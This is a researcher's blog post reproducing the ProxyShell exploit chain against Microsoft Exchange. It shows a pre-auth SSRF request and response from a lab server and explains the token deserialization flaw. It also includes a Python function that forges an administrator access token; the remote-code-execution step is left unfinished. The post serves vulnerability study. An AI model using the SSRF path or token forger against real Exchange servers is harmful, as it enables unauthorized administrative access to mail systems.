---
layout: post
title:  "My journey to reproduce the Proxyshell exploit chain (reported by Orange Tsai)"
date:   2021-08-16 16:00:00 +0700
categories: researches
description: Research analysis and develop a working exploit poc script 
---

## ProxyShell Microsoft Exchange 

Reference: 
- The original talk is from Orange Tsai: [https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-ProxyLogon-Is-Just-The-Tip-Of-The-Iceberg-A-New-Attack-Surface-On-Microsoft-Exchange-Server.pdf?fbclid=IwAR2V0-4k2yb8dmPP5Mksd8iHYTOfE6sBwygMt4wjq3M9be8Tw6TlH0andhA](url)
- Amazing research write up from peterjson and Jang:[ https://peterjson.medium.com/reproducing-the-proxyshell-pwn2own-exploit-49743a4ea9a1](url)
- [https://y4y.space/2021/08/12/my-steps-of-reproducing-proxyshell/](url)


### 1. Pre-auth SSRF

The endpoint `/autodiscover.json` is one of the endpoints that we can access without authentication

<img width="1413" alt="image" src="https://user-images.githubusercontent.com/37280106/129542517-f35ab234-4613-491c-844a-75e88fbf8da8.png">

If our URL end with `/autodiscover.json` , `ClientRequest` will fetch the param `Email` 

<img width="1262" alt="image" src="https://user-images.githubusercontent.com/37280106/129544327-4c4fe18e-eb19-4466-a616-aff25e3a4087.png">

`explicitLogonAddress` must contains valid email address

So if our `explicitLogonAddress=/autodiscover/autodiscover.json?a=a@test.com` then the `/autodiscover/autodiscover.json?a=a@test.com` part will be removed from the URI
ex: `http://exchange.local/autodiscover/autodiscover.json@test.com/mapi/nspi?&Email=autodiscover/autodiscover.json%3F@test.com` will become -> `http://exchange.local/mapi/nspi?&Email=autodiscover/autodiscover.json%3F@test.com`

When preparing request to send to backend internal, Exchange will generate Kerberos auth header and attach into Authorization header. This is why we can reach some other endpoint without any authentication


The Fatal erase: 

```text
GET /autodiscover/autodiscover.json?@test.com/mapi/nspi?&Email=autodiscover/autodiscover.json%3F@test.com HTTP/2
Host: exchange.local
Cookie: cookieTest=1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:90.0) Gecko/20100101 Firefox/90.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Cache-Control: max-age=0
Te: trailers
```

```text
HTTP/2 200 OK
Cache-Control: private
Content-Type: text/html
Vary: Accept-Encoding
Server: Microsoft-IIS/10.0
Request-Id: 505bae40-9e29-4c22-9bb6-68686012d721
X-Calculatedbetarget: win-mkl80dild4h.exchange.local
X-Serverapplication: Exchange/15.01.2176.009
X-Diaginfo: WIN-MKL80DILD4H
X-Beserver: WIN-MKL80DILD4H
X-Aspnet-Version: 4.0.30319
Set-Cookie: X-BackEndCookie=; expires=Thu, 15-Aug-1991 03:08:59 GMT; path=/autodiscover; secure; HttpOnly
X-Powered-By: ASP.NET
X-Feserver: WIN-MKL80DILD4H
Date: Sun, 15 Aug 2021 03:08:58 GMT
Content-Length: 553

<html>
<head>
<title>Exchange MAPI/HTTP Connectivity Endpoint</title>
</head>
<body>
<p>Exchange MAPI/HTTP Connectivity Endpoint<br><br>Version: 15.1.2176.9<br>Vdir Path: /mapi/nspi/<br><br></p><p>
```

<img width="1146" alt="image" src="https://user-images.githubusercontent.com/37280106/129546779-695fca9d-dd4c-47d2-a498-5feb214f5df5.png">

We archieved the Pre-auth SSRF, direct access to Exchange Server back-end !!!


### 2. Exchange Powershell Remoting

The Exchange PowerShell Remoting is built upon PowerShell API and uses the Runspace for isolations. All operations are based on WinRM protocol

We need to look for the way to access `/powershell` endpoint, by accessing `/powershell` endpoint, we are one-step closer to the final goal - RCE

From Orange Tsai's talk, he said that because we access the endpoint with `NT\SYSTEM` priviledge, we will fail the business logic since `SYSTEM` does not have any mailbox.

We cannot forge the `X-CommonAccessToken` because it's in the blacklisted cookies/headers

<img width="1318" alt="image" src="https://user-images.githubusercontent.com/37280106/129550275-02ca7e41-d165-49da-8bf7-0ba303b5ab98.png">



A few modules we should pay attention to

```text
Microsoft.Exchange.Security
Microsoft.Exchange.PwshClient
Microsoft.Exchange.Configuration.RemotePowershellBackendCmdletProxyModule
BackendRehydrationModule
```


From the Orange Tsai's talk, we know that the `BackendRehydrationModule` play an important part in authentication process

<img width="1207" alt="image" src="https://user-images.githubusercontent.com/37280106/129551467-54e67b8e-3232-483b-9bcc-ddfe14de00eb.png">

>  Microsoft.Exchange.Security.Authentication.BackendRehydrationModule

<img width="1048" alt="image" src="https://user-images.githubusercontent.com/37280106/129550769-a21e228c-5ef9-4fd2-89c4-5152a4fe117c.png">

We cannot access `/powershell` endpoint because we don't have `X-CommonAccessToken` header, we cannot forge the `X-CommonAccessToken: <token>` to impersonate other user because `X-CommonAccessToken` is in the blacklisted headers. So what to do ?

Lucky for us, we have a module is called before the `BackendRehydrationModule` and it extract Access-Token fromURL



> Microsoft.Exchange.Configuration.RemotePowershellBackendCmdletProxyModule

<img width="1027" alt="image" src="https://user-images.githubusercontent.com/37280106/129552591-36cdf54c-ae20-462a-954a-f7d4e21d981c.png">


<img width="1033" alt="image" src="https://user-images.githubusercontent.com/37280106/129552443-e99e7e9b-7690-476f-8ca4-73d857621627.png">

The code's logic look for `X-CommonAccessToken` header, if the header is not exist, it will extract `X-RPS-CAT` param and deserialize it as a Access Token (`X-CommonAccessToken` )


> Microsoft.Exchange.Security.Authorization.CommonAccessToken ( serialization process)

<img width="1041" alt="image" src="https://user-images.githubusercontent.com/37280106/129540035-3ab2be12-3540-45dd-85a4-bdb7aeb89581.png">



> Microsoft.Exchange.Security.Authorization.CommonAccessToken (deserialization process)

<img width="1073" alt="image" src="https://user-images.githubusercontent.com/37280106/129540057-3b6def40-f842-4283-aca9-13c20ef48842.png">

The pseudo code for the token deserialization:

```text
V + this.Version + T + this.TokenType C + compress + data
if compress => decompress
if AccessTokenType is Windows => DeserializeFromToken
```

<img width="970" alt="image" src="https://user-images.githubusercontent.com/37280106/129553511-6abd50c8-3fc3-49a9-8c92-59b0311e7916.png">

<img width="1074" alt="image" src="https://user-images.githubusercontent.com/37280106/129553904-94303325-c9b9-485a-a082-dc6de45305f9.png">


Pseudo code for DeserializeFromToken
```
A + this.AuthenticationType + L + this.LogonName + U + UserSID + G + Group Length + GroupSids
```

Now, we can craft an admin privilege CommonAccessToken via “X-Rps-CAT” parameter since we know how the Token is constructed
I copy the `gen_token` function from [https://y4y.space/2021/08/12/my-steps-of-reproducing-proxyshell/](this amazing write-up) to help me build the poc script/
```python
def gen_token(email: str, sid: str):
    # Credits: https://y4y.space/2021/08/12/my-steps-of-reproducing-proxyshell/
    print("[-] Generating token")
    version = 0
    ttype = 'Windows'
    compressed = 0
    auth_type = 'Kerberos'
    raw_token = b''
    gsid = 'S-1-5-32-544'

    version_data = b'V' + (1).to_bytes(1, 'little') + \
        (version).to_bytes(1, 'little')
    type_data = b'T' + (len(ttype)).to_bytes(1, 'little') + ttype.encode()
    compress_data = b'C' + (compressed).to_bytes(1, 'little')
    auth_data = b'A' + (len(auth_type)).to_bytes(1,
                                                 'little') + auth_type.encode()
    login_data = b'L' + (len(email)).to_bytes(1, 'little') + email.encode()
    user_data = b'U' + (len(sid)).to_bytes(1, 'little') + sid.encode()
    group_data = b'G' + struct.pack('<II', 1, 7) + \
        (len(gsid)).to_bytes(1, 'little') + gsid.encode()
    ext_data = b'E' + struct.pack('>I', 0)

    raw_token += version_data
    raw_token += type_data
    raw_token += compress_data
    raw_token += auth_data
    raw_token += login_data
    raw_token += user_data
    raw_token += group_data
    raw_token += ext_data

    data = base64.b64encode(raw_token).decode()

    print(f"[+] Token generated: {data}")
    return data

```

### 3. Working with remote Powershell and archived RCE
Working on it ...
